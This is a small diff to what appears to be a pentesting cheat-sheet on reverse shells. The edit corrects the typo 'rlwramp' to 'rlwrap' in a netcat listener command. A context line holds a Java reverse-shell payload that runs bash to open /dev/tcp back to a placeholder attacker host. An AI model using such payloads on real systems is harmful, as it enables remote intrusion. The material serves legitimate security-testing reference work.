@@ -40,7 +40,7 @@ r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<lhost>/
 
 ## windows listener autocompletion
 ```
-rlwramp nc -nlvp <port>
+rlwrap nc -nlvp <port>
 ```
 
 ## interactive reverse shell - and Ctrl+Z (1) 
